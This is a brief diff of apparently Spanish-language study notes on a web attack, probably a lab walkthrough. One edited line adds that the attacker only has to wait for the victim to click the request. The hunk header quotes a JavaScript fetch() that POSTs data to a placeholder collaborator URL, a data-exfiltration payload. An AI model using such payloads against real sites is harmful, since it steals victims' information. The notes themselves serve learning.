@@ -44,5 +44,5 @@ fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: e
 
 ![[Pasted image 20250729142914.png]]
 
-una vez realizado esto solo debemos esperar a que la victima haga clic en la solicitu
+una vez realizado esto solo debemos esperar a que la victima haga clic en la solicitud para recibir la informacion
 ![[Pasted image 20250729142857.png]]
